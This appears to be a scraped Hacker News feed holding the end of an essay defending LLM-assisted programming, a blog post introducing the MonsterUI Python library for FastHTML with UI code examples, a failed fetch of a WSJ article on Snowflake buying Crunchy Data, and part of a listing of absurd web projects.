<p>And LLMs aren‚Äôt mediocre on every axis. They almost certainly have a bigger bag of algorithmic tricks than you do: radix tries, topological sorts, graph reductions, and LDPC codes. Humans romanticize <code>rsync</code> (<a href="https://www.andrew.cmu.edu/course/15-749/READINGS/required/cas/tridgell96.pdf" title="">Andrew Tridgell</a> wrote a paper about it!). To an LLM it might not be that much more interesting than a SQL join.</p>

<p>But I‚Äôm getting ahead of myself. It doesn‚Äôt matter. If truly mediocre code is all we ever get from LLM, that‚Äôs still huge. It‚Äôs that much less mediocre code humans have to write.</p>
<h3 id="but-itll-never-be-agi"><a href="#but-itll-never-be-agi" aria-label="Anchor"></a><span>but it‚Äôll never be AGI</span></h3>
<p>I don‚Äôt give a shit.</p>

<p>Smart practitioners get wound up by the AI/VC hype cycle. I can‚Äôt blame them. But it‚Äôs not an argument. Things either work or they don‚Äôt, no matter what Jensen Huang has to say about it.</p>
<h3 id="but-they-take-rr-jerbs"><a href="#but-they-take-rr-jerbs" aria-label="Anchor"></a><span>but they take-rr jerbs</span></h3>
<p><a href="https://news.ycombinator.com/item?id=43776612" title="">So does open source.</a> We used to pay good money for databases.</p>

<p>We‚Äôre a field premised on automating other people‚Äôs jobs away. ‚ÄúProductivity gains,‚Äù say the economists. You get what that means, right? Fewer people doing the same stuff. Talked to a travel agent lately? Or a floor broker? Or a record store clerk? Or a darkroom tech?</p>

<p>When this argument comes up, libertarian-leaning VCs start the chant: lamplighters, creative destruction, new kinds of work. Maybe. But I‚Äôm not hypnotized. I have no fucking clue whether we‚Äôre going to be better off after LLMs. Things could get a lot worse for us.</p>

<p>LLMs really might displace many software developers. That‚Äôs not a high horse we get to ride. Our jobs are just as much in tech‚Äôs line of fire as everybody else‚Äôs have been for the last 3 decades. We‚Äôre not <a href="https://en.wikipedia.org/wiki/2024_United_States_port_strike" title="">East Coast dockworkers</a>; we won‚Äôt stop progress on our own.</p>
<h3 id="but-the-plagiarism"><a href="#but-the-plagiarism" aria-label="Anchor"></a><span>but the plagiarism</span></h3>
<p>Artificial intelligence is profoundly ‚Äî and probably unfairly ‚Äî threatening to visual artists in ways that might be hard to appreciate if you don‚Äôt work in the arts.</p>

<p>We imagine artists spending their working hours pushing the limits of expression. But the median artist isn‚Äôt producing gallery pieces. They produce on brief: turning out competent illustrations and compositions for magazine covers, museum displays, motion graphics, and game assets.</p>

<p>LLMs easily ‚Äî alarmingly ‚Äî clear industry quality bars . Gallingly, one of the things they‚Äôre best at is churning out just-good-enough facsimiles of human creative work.  I have family in visual arts. I can‚Äôt talk to them about LLMs. I don‚Äôt blame them. They‚Äôre probably not wrong.</p>

<p>Meanwhile, software developers spot code fragments <a href="https://arxiv.org/abs/2311.17035">seemingly lifted</a> from public repositories on Github and lose their shit. What about the licensing? If you‚Äôre a lawyer, I defer. But if you‚Äôre a software developer playing this card? Cut me a little slack as I ask you to shove this concern up your ass. No profession has demonstrated more contempt for intellectual property.</p>

<p>The median dev thinks Star Wars and Daft Punk are a public commons. The great cultural project of developers has been opposing any protection that might inconvenience a monetizable media-sharing site. When they fail at policy, they route around it with coercion. They stand up global-scale piracy networks and sneer at anybody who so much as tries to preserve a new-release window for a TV show.</p>

<p>Call any of this out if you want to watch a TED talk about how hard it is to stream <em>The Expanse</em> on LibreWolf. Yeah, we get it. You don‚Äôt believe in IPR. Then shut the fuck up about IPR. Reap the whirlwind.</p>

<p>It‚Äôs all special pleading anyways. LLMs digest code further than you do. If you don‚Äôt believe a typeface designer can stake a moral claim on the terminals and counters of a letterform, you sure as hell can‚Äôt be possessive about a red-black tree.</p>
<h3 id="positive-case-redux"><a href="#positive-case-redux" aria-label="Anchor"></a><span>positive case redux</span></h3>
<p>When I started writing a couple days ago, I wrote a section to ‚Äúlevel set‚Äù to the  state of the art of LLM-assisted programming. A bluefish filet has a longer shelf life than an LLM take. In the time it took you to read this, everything changed.</p>

<p>Kids today don‚Äôt just use agents; they use asynchronous agents. They wake up, free-associate 13 different things for their LLMs to work on, make coffee, fill out a TPS report, drive to the Mars Cheese Castle, and then check their notifications. They‚Äôve got 13 PRs to review. Three get tossed and re-prompted. Five of them get the same feedback a junior dev gets. And five get merged.</p>

<p><em>‚ÄúI‚Äôm sipping rocket fuel right now,‚Äù</em> a friend tells me. <em>‚ÄúThe folks on my team who aren‚Äôt embracing AI? It‚Äôs like they‚Äôre standing still.‚Äù</em> He‚Äôs not bullshitting me. He doesn‚Äôt work in SFBA. He‚Äôs got no reason to lie.</p>

<p>There‚Äôs plenty of things I can‚Äôt trust an LLM with. No LLM has any of access to prod here. But I‚Äôve been first responder on an incident and fed 4o ‚Äî not o4-mini, 4o ‚Äî log transcripts, and watched it in seconds spot LVM metadata corruption issues on a host we‚Äôve been complaining about for months. Am I better than an LLM agent at interrogating OpenSearch logs and Honeycomb traces? No. No, I am not.</p>

<p>To the consternation of many of my friends, I‚Äôm not a radical or a futurist. I‚Äôm a statist. I believe in the haphazard perseverance of complex systems, of institutions, of reversions to the mean. I write Go and Python code. I‚Äôm not a Kool-aid drinker.</p>

<p>But something real is happening. My smartest friends are blowing it off. Maybe I persuade you. Probably I don‚Äôt. But we need to be done making space for bad arguments.</p>
<h3 id="but-im-tired-of-hearing-about-it"><a href="#but-im-tired-of-hearing-about-it" aria-label="Anchor"></a><span>but i‚Äôm tired of hearing about it</span></h3>
<p>And here I rejoin your company. I read <a href="https://simonwillison.net/" title="">Simon Willison</a>, and that‚Äôs all I really need. But all day, every day, a sizable chunk of the front page of HN is allocated to LLMs: incremental model updates, startups doing things with LLMs, LLM tutorials, screeds against LLMs. It‚Äôs annoying!</p>

<p>But AI is also incredibly ‚Äî a word I use advisedly ‚Äî important. It‚Äôs getting the same kind of attention that smart phones got in 2008, and not as much as the Internet got. That seems about right.</p>

<p>I think this is going to get clearer over the next year. The cool kid haughtiness about ‚Äústochastic parrots‚Äù and ‚Äúvibe coding‚Äù can‚Äôt survive much more contact with reality. I‚Äôm snarking about these people, but I meant what I said: they‚Äôre smarter than me. And when they get over this affectation, they‚Äôre going to make coding agents profoundly more effective than they are today.</p>

          
        </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[MonsterUI: Python library for building front end UIs quickly in FastHTML apps (108 pts)]]></title>
            <link>https://www.answer.ai/posts/2025-01-15-monsterui.html</link>
            <guid>44162814</guid>
            <pubDate>Mon, 02 Jun 2025 20:41:24 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.answer.ai/posts/2025-01-15-monsterui.html">https://www.answer.ai/posts/2025-01-15-monsterui.html</a>, See on <a href="https://news.ycombinator.com/item?id=44162814">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="quarto-content">
<!-- sidebar -->
<!-- margin-sidebar -->
    
<!-- main -->
<main id="quarto-document-content">




<p>Modern web development requires complicated dependencies and extensive boilerplate spread over multiple languages to make good UI. <a href="https://monsterui.answer.ai/">MonsterUI</a> is here to fix that.</p>
<section id="the-problem-with-web-ui-development">
<h2 data-anchor-id="the-problem-with-web-ui-development">The Problem with Web UI Development</h2>
<p>Building attractive web applications has always been complicated. <a href="https://www.fastht.ml/" target="_blank">FastHTML</a> simplifies web app development by bringing HTMX, Starlette, HTML, and HTTP fundamentals together.</p>
<p>Getting the aesthetics right is still too hard. It requires either extensive <a href="https://www.w3schools.com/css/css_intro.asp" target="_blank">CSS</a>, a framework with long inline class strings, or both. You might try <a href="https://getbootstrap.com/" target="_blank">Bootstrap</a> or <a href="https://tailwindcss.com/" target="_blank">Tailwind</a> CSS. Now, you‚Äôre managing class names, remembering utility patterns, and checking docs for boilerplate class strings. This leads to code that is hard to build, maintain, and change for anyone who is not an expert designer.</p>
<p>A typical app has many components: nav bars, forms, modals, cards, and more. Each requires careful consideration of styling, responsive behavior, and interactive states. As your application grows, managing these styles consistently becomes more and more challenging.</p>
<p>This became apparent to me while I was developing web apps. I found myself copying and pasting class strings and maintaining complex styling logic across multiple components. FastHTML made the application logic development a joy, but the styling side remained a constant source of friction.</p>
<p>If you‚Äôre tired of context-switching between HTML, CSS, and Python just to build basic web UIs, <a href="https://monsterui.answer.ai/" target="_blank">MonsterUI</a> might be for you.</p>
</section>
<section id="real-world-example-building-a-blog">
<h2 data-anchor-id="real-world-example-building-a-blog">Real-World Example: Building a Blog</h2>
<p><iframe data-external="1" src="https://www.youtube.com/embed/Oe6DusrUD0U" title="" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></p>
</section>
<section id="introducing-monsterui">
<h2 data-anchor-id="introducing-monsterui">Introducing MonsterUI</h2>
<p><code>MonsterUI</code> lets anyone build high-quality, modern web apps in pure Python without sacrificing design quality.</p>
<div>
<figure>
<p><img src="https://www.answer.ai/posts/MonsterUI/cards.png"></p>
<figcaption>Built with MonsterUI, styled with FrankenUI, based on design by Shadcn</figcaption>
</figure>
</div>
<p><code>MonsterUI</code> is a layer on top of FastHTML that provides pre-styled components and smart defaults based on modern libraries (such as Tailwind, FrankenUI, DaisyUI) while maintaining full access to Tailwind CSS when you need it. MonsterUI:</p>
<ul>
<li>Brings FastHTML‚Äôs simplicity to web styling.</li>
<li>Provides beautiful, responsive components without writing a single CSS class.<br>
</li>
<li>Lets you focus on building features instead of remembering utility classes.</li>
</ul>
<p>Let‚Äôs learn by example with a card for team members:</p>
<div id="cb1"><pre><code><span id="cb1-1"><span>def</span> TeamCard(name, role, location<span>=</span><span>"Remote"</span>):</span>
<span id="cb1-2">    icons <span>=</span> (<span>"mail"</span>, <span>"linkedin"</span>, <span>"github"</span>)</span>
<span id="cb1-3">    <span>return</span> Card(</span>
<span id="cb1-4">        DivLAligned(</span>
<span id="cb1-5">            DiceBearAvatar(name, h<span>=</span><span>24</span>, w<span>=</span><span>24</span>),</span>
<span id="cb1-6">            Div(H3(name), P(role))),</span>
<span id="cb1-7">        footer<span>=</span>DivFullySpaced(</span>
<span id="cb1-8">            DivHStacked(UkIcon(<span>"map-pin"</span>, height<span>=</span><span>16</span>), P(location)),</span>
<span id="cb1-9">            DivHStacked(<span>*</span>(UkIconLink(icon, height<span>=</span><span>16</span>) <span>for</span> icon <span>in</span> icons))))</span></code></pre></div>
<p>I specified the entire layout, font sizing, icons, and avatar using only Python. I controlled everything without needing special flexbox or CSS class knowledge.</p>

<div>
<div data-bs-toggle="collapse" data-bs-target=".callout-1-contents" aria-controls="callout-1" aria-expanded="false" aria-label="Toggle callout">

<p>
Expand to see boilerplate you‚Äôd need if you weren‚Äôt using <code>MonsterUI</code>
</p>

</div>
<div id="callout-1"><pre><code><span id="cb2-1">dicebear_url <span>=</span> <span>'https://api.dicebear.com/8.x/lorelei/svg?seed=James Wilson'</span></span>
<span id="cb2-2">Div(Div(Div(</span>
<span id="cb2-3">    Span(Img(alt<span>=</span><span>'Avatar'</span>, loading<span>=</span><span>'lazy'</span>, src<span>=</span>dicebear_url, </span>
<span id="cb2-4">             cls<span>=</span><span>'aspect-square h-24 w-24'</span>),cls<span>=</span><span>'relative flex h-24 w-24 shrink-0 overflow-hidden rounded-full bg-accent'</span>),</span>
<span id="cb2-5">    Div(H3(<span>'James Wilson'</span>, cls<span>=</span><span>'uk-h3'</span>),</span>
<span id="cb2-6">        P(<span>'Senior Developer'</span>)),</span>
<span id="cb2-7">            cls<span>=</span><span>'uk-flex uk-flex-left uk-flex-middle space-x-4'</span>),</span>
<span id="cb2-8">        cls<span>=</span><span>'uk-card-body space-y-6'</span>),</span>
<span id="cb2-9">    Div(Div(Div(</span>
<span id="cb2-10">                Uk_icon(icon<span>=</span><span>'map-pin'</span>, height<span>=</span><span>'16'</span>),</span>
<span id="cb2-11">                P(<span>'New York'</span>),</span>
<span id="cb2-12">                cls<span>=</span><span>'uk-flex uk-flex-row uk-flex-middle space-x-4'</span>),</span>
<span id="cb2-13">            Div(A(Uk_icon(icon<span>=</span><span>'mail'</span>, height<span>=</span><span>'16'</span>),href<span>=</span><span>'#'</span>,cls<span>=</span><span>'uk-icon-link'</span>),</span>
<span id="cb2-14">                A(Uk_icon(icon<span>=</span><span>'linkedin'</span>, height<span>=</span><span>'16'</span>),href<span>=</span><span>'#'</span>,cls<span>=</span><span>'uk-icon-link'</span>),</span>
<span id="cb2-15">                A(Uk_icon(icon<span>=</span><span>'github'</span>, height<span>=</span><span>'16'</span>),href<span>=</span><span>'#'</span>,cls<span>=</span><span>'uk-icon-link'</span>),</span>
<span id="cb2-16">                cls<span>=</span><span>'uk-flex uk-flex-row uk-flex-middle space-x-4'</span>),</span>
<span id="cb2-17">            cls<span>=</span><span>'uk-flex uk-flex-between uk-flex-middle uk-width-1-1'</span>),</span>
<span id="cb2-18">        cls<span>=</span><span>'uk-card-footer'</span>),</span>
<span id="cb2-19">    cls<span>=</span><span>'uk-card'</span>)</span></code></pre></div>
</div>
</section>
<section id="what-monsterui-does-for-you">
<h2 data-anchor-id="what-monsterui-does-for-you">What MonsterUI does for you</h2>
<p><code>MonsterUI</code> is based on a simple principle: provide smart defaults while allowing full flexibility.</p>
<p>We‚Äôve done this by builing upon proven approaches from some of the most innovative projects in modern web development, carefully selecting components that address the pain points of raw HTML/CSS while maintaining mature, battle-tested strategies.</p>
<p>MonsterUI‚Äôs core is <a href="https://franken-ui.dev/" target="_blank">FrankenUI</a>, an innovative framework-free UI library by <a href="https://x.com/sveltecult" target="_blank">sveltecult</a> that uses beautiful HTML-first components. FrankenUI itself was inspired by <a href="https://ui.shadcn.com/" target="_blank">shadcn/ui</a> by <a href="https://x.com/shadcn" target="_blank">shadcn</a> which pioneered the concept of copy-pasteable UI components for React.</p>
<p>Raw HTML and CSS present two key challenges: dated visual aesthetics and complex layout management. By combining FrankenUI‚Äôs framework-agnostic approach with FastHTML, MonsterUI delivers modern, beautiful components that integrate seamlessly with HTMX‚Äôs progressive enhancement paradigm - all while maintaining clean, readable code.</p>
<p>This isn‚Äôt just theory - we‚Äôre using <code>MonsterUI</code> in production for new applications we‚Äôre testing with preview customers, where it powers everything from complex dialog interfaces to dynamic content rendering. The library has been proven robust and maintainable in real-world enterprise settings.</p>
<p>Let‚Äôs explore some key features:</p>
<section id="theme">
<h3 data-anchor-id="theme">Theme</h3>
<p>Pick a color theme for your app. There are <a href="https://monsterui.answer.ai/api_ref/docs_theme_headers#theme" target="_blank">12 colors</a> to choose from, each with a dark and a light mode. By default it uses the user‚Äôs system preferences.</p>
<p>All themes are synced so components look good on the same page regardless of whether the component is styled with FrankenUI, DaisyUI, or another framework.</p>
<p>Themes add the boilerplate needed to make color styling consistent throughout your app.</p>
<div id="cb3"><pre><code><span id="cb3-1">app, rt <span>=</span> fast_app(hdrs<span>=</span>Theme.blue.headers())</span></code></pre></div>
</section>
<section id="base-components">
<h3 data-anchor-id="base-components">Base Components</h3>
<p>Every HTML element in <code>MonsterUI</code> comes with sensible default styling. A <a href="https://monsterui.answer.ai/api_ref/docs_button_link#button" target="_blank">Button</a> isn‚Äôt just an HTML button. It‚Äôs a styled component with hover states, focus rings, and consistent padding.</p>

<p><code>MonsterUI</code> provides data structures (<code>ListT</code>, <code>TextT</code>, <code>ButtonT</code>, etc.) for easy discoverability and tab completion for selecting styles.</p>
<p>For example, to style it with your Theme‚Äôs primary color, use <code>ButtonT.primary</code>. Primary colors are used for action buttons like ‚ÄúAdd to Cart‚Äù or ‚ÄúSubmit.‚Äù</p>
<div id="cb5"><pre><code><span id="cb5-1">Button(<span>"Add to Cart"</span>, cls<span>=</span>ButtonT.primary)</span></code></pre></div>
</section>
<section id="semantic-text-styles">
<h3 data-anchor-id="semantic-text-styles">Semantic Text Styles</h3>
<p>Build on the foundations of the web, MonsterUI styles semantic tags based on the HTML spec. This means that we have styled functions that match the themes that use standard HTML tags like emphasis (<code>&lt;em&gt;</code>), citation (<code>&lt;cite&gt;</code>), Marked (<code>&lt;mark&gt;</code>), small (<code>&lt;small&gt;</code>) and much more.</p>
<div id="cb6"><pre><code><span id="cb6-1">Card(</span>
<span id="cb6-2">    H1(<span>"MonsterUI's Semantic Text"</span>),</span>
<span id="cb6-3">    P(</span>
<span id="cb6-4">        Strong(<span>"MonsterUI"</span>), <span>" brings the power of semantic HTML to life with "</span>,</span>
<span id="cb6-5">        Em(<span>"beautiful styling"</span>), <span>" and "</span>, Mark(<span>"zero configuration"</span>), <span>"."</span>),</span>
<span id="cb6-6">    Blockquote(</span>
<span id="cb6-7">        P(<span>"Write semantic HTML in pure Python, get modern styling for free."</span>),</span>
<span id="cb6-8">        Cite(<span>"MonsterUI Team"</span>)),</span>
<span id="cb6-9">    footer<span>=</span>Small(<span>"Released February 2025"</span>),</span>
<span id="cb6-10">)</span></code></pre></div>
<p><img src="https://www.answer.ai/posts/MonsterUI/SemanticText.png"></p>
</section>
<section id="smart-layout-helpers">
<h3 data-anchor-id="smart-layout-helpers">Smart Layout Helpers</h3>
<p>Overall page layout is made simple with the smart layout helpers (<code>DivVStacked</code>, <code>DivCentered</code>, <code>DivFullySpaced</code>, <code>Grid</code>, etc.). For example, <code>DivVStacked</code> stacks things vertically. <code>Grid</code> creates a grid in which to place components.</p>
<div id="cb7"><pre><code><span id="cb7-1">DivFullySpaced(</span>
<span id="cb7-2">    H1(<span>"Dashboard"</span>), </span>
<span id="cb7-3">    DivRAligned(</span>
<span id="cb7-4">        Button(<span>"Export"</span>, cls<span>=</span>ButtonT.secondary),</span>
<span id="cb7-5">        Button(<span>"New Entry"</span>, cls<span>=</span>ButtonT.primary)))</span>
<span id="cb7-6"></span>
<span id="cb7-7"><span># Grid layout with smart responsive columns for mobile vs desktop</span></span>
<span id="cb7-8"><span># Easy args to customize responsiveness as you need</span></span>
<span id="cb7-9">Grid(<span>map</span>(TeamCard, products), cols_max<span>=</span><span>3</span>)</span></code></pre></div>
<blockquote>
<p>Note: See our <a href="https://monsterui.answer.ai/tutorial_layout">layout tutorial</a> for more details and advanced usage</p>
</blockquote>
</section>
<section id="common-ui-patterns">
<h3 data-anchor-id="common-ui-patterns">Common UI Patterns</h3>
<p><code>MonsterUI</code> includes shortcuts for common UI patterns. For example, you almost always want an input text box to have a label to communicate what it‚Äôs for so we have provided <code>LabelInput</code> as a shortcut that creates a <code>Label</code> and <code>Input</code> pair..</p>
<div id="cb8"><pre><code><span id="cb8-1">LabelInput(<span>"Name"</span>, <span>id</span><span>=</span><span>'myid'</span>)</span></code></pre></div>
<p>You can use <code>Div</code>, <code>FormLabel</code>, and <code>Input</code> to do this yourself, but this pattern is so common we‚Äôve provided a shortcut. Here‚Äôs what the shortcut replaces:</p>
<div id="cb9"><pre><code><span id="cb9-1">Div(FormLabel(<span>'Name'</span>, fr<span>=</span><span>'myid'</span>),</span>
<span id="cb9-2">    Input(<span>id</span><span>=</span><span>'myid'</span>, name<span>=</span><span>'myid'</span>),</span>
<span id="cb9-3">    cls<span>=</span><span>'space-y-2'</span>)</span></code></pre></div>
</section>
<section id="higher-level-components">
<h3 data-anchor-id="higher-level-components">Higher Level Components</h3>
<p>We also provide helpers to generate more complex components such as <a href="https://monsterui.answer.ai/api_ref/docs_navigation#navbars" target="_blank">navbars</a>, <a href="https://monsterui.answer.ai/api_ref/docs_modals" target="_blank">modals</a>, <a href="https://monsterui.answer.ai/api_ref/docs_cards" target="_blank">cards</a>, and <a href="https://monsterui.answer.ai/api_ref/docs_tables" target="_blank">tables</a>. Each of these is built on top of several base components (<code>ModalContainer</code>, <code>ModalDialog</code>, etc.) so you could build them up yourself. However, the helper function usually gives all the flexibility you need without needing to write your own boilerplate. These helper functions create good UX behavior for you such as automatically collapsing your NavBar into a hamburger menu on mobile.</p>
<p>For example to create a button that opens a modal:</p>
<div id="cb10"><pre><code><span id="cb10-1">Div(Button(<span>"Open Modal"</span>,uk_toggle<span>=</span><span>"target: #my-modal"</span> ),</span>
<span id="cb10-2">    Modal(ModalTitle(<span>"Simple Test Modal"</span>), </span>
<span id="cb10-3">          P(<span>"With some somewhat brief content to show that it works!"</span>, </span>
<span id="cb10-4">              cls<span>=</span>TextPresets.muted_sm),</span>
<span id="cb10-5">          footer<span>=</span>ModalCloseButton(<span>"Close"</span>, cls<span>=</span>ButtonT.primary),<span>id</span><span>=</span><span>'my-modal'</span>))</span></code></pre></div>
<p><img src="https://www.answer.ai/posts/MonsterUI/ModalEx2.png"></p>
<div>
<div data-bs-toggle="collapse" data-bs-target=".callout-2-contents" aria-controls="callout-2" aria-expanded="false" aria-label="Toggle callout">

<p>
Expand to see boilerplate you‚Äôd need if you weren‚Äôt using <code>MonsterUI</code>
</p>

</div>
<div id="callout-2"><pre><code><span id="cb11-1">Div(Button(<span>'Open Modal'</span>, <span>type</span><span>=</span><span>'button'</span>, uk_toggle<span>=</span><span>'target: #my-modal'</span>, </span>
<span id="cb11-2">           cls<span>=</span><span>'uk-button uk-button-default'</span>),</span>
<span id="cb11-3">    Div(Div(Div(H2(<span>'Simple Test Modal'</span>, cls<span>=</span><span>'uk-modal-title'</span>),</span>
<span id="cb11-4">                P(<span>'With some somewhat brief content to show that it works!'</span>, </span>
<span id="cb11-5">                  cls<span>=</span><span>'uk-text-muted uk-text-small'</span>),</span>
<span id="cb11-6">                cls<span>=</span><span>'uk-modal-body space-y-6'</span>),</span>
<span id="cb11-7">            Div(Button(<span>'Close'</span>, <span>type</span><span>=</span><span>'button'</span>, </span>
<span id="cb11-8">                       cls<span>=</span><span>'uk-button uk-modal-close uk-button-primary'</span>),</span>
<span id="cb11-9">                cls<span>=</span><span>'uk-modal-footer'</span>),</span>
<span id="cb11-10">            cls<span>=</span><span>'uk-modal-dialog'</span>),</span>
<span id="cb11-11">        uk_modal<span>=</span><span>True</span>,</span>
<span id="cb11-12">        <span>id</span><span>=</span><span>'my-modal'</span>,</span>
<span id="cb11-13">        cls<span>=</span><span>'uk-modal uk-modal-container'</span>))</span></code></pre></div>
</div>
</section>
<section id="rendering-markdown">
<h3 data-anchor-id="rendering-markdown">Rendering Markdown</h3>
<p><code>MonsterUI</code> provides a <code>render_md</code> function that converts Markdown to styled HTML, with syntax highlighting via HighlightJS for code blocks, FrankenUI classes for styling, and Tailwind for additional styling and spacing. Here‚Äôs how to use it:</p>
<div id="cb12"><pre><code><span id="cb12-1">render_md(<span>"""</span></span>
<span id="cb12-2"><span># My Document</span></span>
<span id="cb12-3"></span>
<span id="cb12-4"><span>&gt; Important note here</span></span>
<span id="cb12-5"></span>
<span id="cb12-6"><span>+ List item with **bold**</span></span>
<span id="cb12-7"><span>+ Another with `code`</span></span>
<span id="cb12-8"></span>
<span id="cb12-9"><span>```python</span></span>
<span id="cb12-10"><span>def hello():</span></span>
<span id="cb12-11"><span>    print("world")</span></span>
<span id="cb12-12"><span>```</span></span>
<span id="cb12-13"><span>"""</span>)</span></code></pre></div>
<p><img src="https://www.answer.ai/posts/MonsterUI/render_md.png"></p>
</section>
</section>
<section id="getting-started">
<h2 data-anchor-id="getting-started">Getting Started</h2>
<p>First, install it using pip:</p>

<p>Create a new FastHTML application with <code>MonsterUI</code> styling:</p>
<div id="cb14"><pre><code><span id="cb14-1"><span>from</span> fasthtml.common <span>import</span> <span>*</span></span>
<span id="cb14-2"><span>from</span> monsterui.<span>all</span> <span>import</span> <span>*</span></span>
<span id="cb14-3"></span>
<span id="cb14-4"><span># Choose a theme color (blue, green, red, etc)</span></span>
<span id="cb14-5">hdrs <span>=</span> Theme.blue.headers()</span>
<span id="cb14-6"></span>
<span id="cb14-7"><span># Create your app with the theme</span></span>
<span id="cb14-8">app, rt <span>=</span> fast_app(hdrs<span>=</span>hdrs)</span>
<span id="cb14-9"></span>
<span id="cb14-10"><span>@rt</span></span>
<span id="cb14-11"><span>def</span> index():</span>
<span id="cb14-12">    socials <span>=</span> ((<span>'github'</span>,<span>'https://github.com/AnswerDotAI/MonsterUI'</span>),</span>
<span id="cb14-13">               (<span>'twitter'</span>,<span>'https://twitter.com/isaac_flath/'</span>),</span>
<span id="cb14-14">               (<span>'linkedin'</span>,<span>'https://www.linkedin.com/in/isaacflath/'</span>))</span>
<span id="cb14-15">    <span>return</span> Titled(<span>"Your First App"</span>,</span>
<span id="cb14-16">        Card(</span>
<span id="cb14-17">            H1(<span>"Welcome!"</span>),</span>
<span id="cb14-18">            P(<span>"Your first MonsterUI app"</span>, cls<span>=</span>TextPresets.muted_sm),</span>
<span id="cb14-19">            P(<span>"I'm excited to see what you build with MonsterUI!"</span>),</span>
<span id="cb14-20">            footer<span>=</span>DivLAligned(<span>*</span>[UkIconLink(icon,href<span>=</span>url) <span>for</span> icon,url <span>in</span> socials])))</span>
<span id="cb14-21"></span>
<span id="cb14-22">serve()</span></code></pre></div>
<p>That‚Äôs it! You now have a styled application with zero configuration. The app already includes:</p>
<ul>
<li>Automatic dark/light mode based on user preferences</li>
<li>Properly styled typography and spacing</li>
<li>Responsive layout that works on all devices</li>
<li>Beautiful UI components ready to use</li>
<li>Synchronized color scheme with DaisyUI, FrankenUI, and Tailwind</li>
</ul>
<p>Check out our <a href="https://monsterui.answer.ai/" target="_blank">documentation</a> for more examples and component references.</p>


</section>

</main> <!-- /main -->

</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Snowflake to buy Crunchy Data for $250M (147 pts)]]></title>
            <link>https://www.wsj.com/articles/snowflake-to-buy-crunchy-data-for-250-million-233543ab</link>
            <guid>44162443</guid>
            <pubDate>Mon, 02 Jun 2025 20:01:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.wsj.com/articles/snowflake-to-buy-crunchy-data-for-250-million-233543ab">https://www.wsj.com/articles/snowflake-to-buy-crunchy-data-for-250-million-233543ab</a>, See on <a href="https://news.ycombinator.com/item?id=44162443">Hacker News</a></p>
Couldn't get https://www.wsj.com/articles/snowflake-to-buy-crunchy-data-for-250-million-233543ab: Error: Request failed with status code 401]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: I build one absurd web project every month (250 pts)]]></title>
            <link>https://absurd.website</link>
            <guid>44162363</guid>
            <pubDate>Mon, 02 Jun 2025 19:52:46 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://absurd.website">https://absurd.website</a>, See on <a href="https://news.ycombinator.com/item?id=44162363">Hacker News</a></p>
<div id="readability-page-1" class="page">
   
   <p><a href="https://www.facebook.com/absurd.website" target="_blank"><img src="https://absurd.website/thumb/fb.png"></a> &nbsp;
<a href="https://www.instagram.com/absurd.website" target="_blank"><img src="https://absurd.website/thumb/insta.png"></a> &nbsp;  
<a href="https://twitter.com/AbsurdWebsite" target="_blank"><img src="https://absurd.website/thumb/twitter.png"></a> &nbsp;  
<a href="https://www.tiktok.com/@absurd.website" target="_blank"><img src="https://absurd.website/tiktok.png"></a> &nbsp;  
<a href="https://www.reddit.com/r/absurd_website/" target="_blank"><img src="https://absurd.website/reddit.png"></a></p>
   
   
    




	
	
	



<div>
<p><a href="https://absurd.website/lucky-cat/" target="_blank"><img src="https://absurd.website/thumb/absurd_website_lucky_cat.png" loading="lazy"></a></p><h2><a href="https://absurd.website/lucky-cat/" target="_blank">Add Luck to Your e-Store üí∏</a></h2><p>
eCommerce is hard.<br>
So we made a waving cat.<br>
It goes üê±üëã in the corner of your site and people buy more.<br>
That‚Äôs marketing now.

</p><p><span>Absurd Nr.27
</span></p>
<br>
</div>
<br>








<br>


<br>

<div>
<p><a href="https://absurd.website/lingoprio/" target="_blank"><img src="https://absurd.website/thumb/lingoprio.png" loading="lazy"></a></p><h2><a href="https://absurd.website/lingoprio/" target="_blank">LingoPrio</a></h2><p>
The Fastest Way to Learn 5 Languages! üöÄüî•<br>
Your brain already knows these words‚Äîyou just need to remember! üß†‚ú®<br>
Unlock 350+ words in just 5 minutes and see how easy language learning can be!

</p><p><span>Absurd Nr.24
</span></p>
<br>
</div>
<br>


<div>
<p><a href="https://absurd.website/artists-death-effect/" target="_blank"><img src="https://absurd.website/thumb/artists-death-effect.png" loading="lazy"></a></p><h2><a href="https://absurd.website/artists-death-effect/" target="_blank">Artist's Death Effect Database</a></h2><p>
When an artist passes away ‚Ä†, the supply of their work becomes permanently limited, often leading to a surge in value.</p><p><span>Absurd Nr.23
</span></p>
<br>
</div>
<br>	

<div>
<p><a href="https://absurd.website/sexy-math/" target="_blank"><img src="https://absurd.website/thumb/sexy-math.jpg"></a></p><h2><a href="https://absurd.website/sexy-math/" target="_blank">Sexy Math</a></h2><p>
Let's Make Learning Math Sexy Again!</p><p><span>Absurd Nr.22
</span></p>
<br>
</div>
<br>	



<br>	


<br>	



<br>	
	
<div>
<p><a href="https://absurd.website/influencer-overnight/" target="_blank"><img src="https://absurd.website/thumb/influencer_overnight.png" loading="lazy"></a></p><h2><a href="https://absurd.website/influencer-overnight/" target="_blank">Influencer Overnight</a></h2><p>
Want to become an influencer with 100,000 followers?<br>When we reach 100k followers, we‚Äôll randomly pick one follower to take over the account.<br>
Join our fun social experiment!

</p><p><span>Absurd Nr.18
</span></p>
<br>
</div>
<br>
	
												  <div>
<p><a href="https://absurd.website/stealing-from-dreams/" target="_blank"><img src="https://absurd.website/thumb/stealing-from-dreams.png" loading="lazy"></a></p><h2><a href="https://absurd.website/stealing-from-dreams/" target="_blank">Stealing From Dreams</a></h2><p>
Choose any artwork from our images, and we will create it for you. Let's steal art from dreams!</p><p><span>Absurd Nr.17
</span></p>
<br>
</div>
<br>
	
											  <div>
<p><a href="https://absurd.website/a-guide-for-aliens-to-live-on-earth/" target="_blank"><img src="https://absurd.website/thumb/A-GUIDE-FOR-ALIENS-LIVING-ON-EARTH-BOOK-ABSURD.png" loading="lazy"></a></p><h2><a href="https://absurd.website/a-guide-for-aliens-to-live-on-earth/" target="_blank">A Guide For Aliens To Live On Earth</a></h2><p>
Just like every tourist visiting a new destination, we believe aliens deserve their own guidebook when they visit our planet.<br>
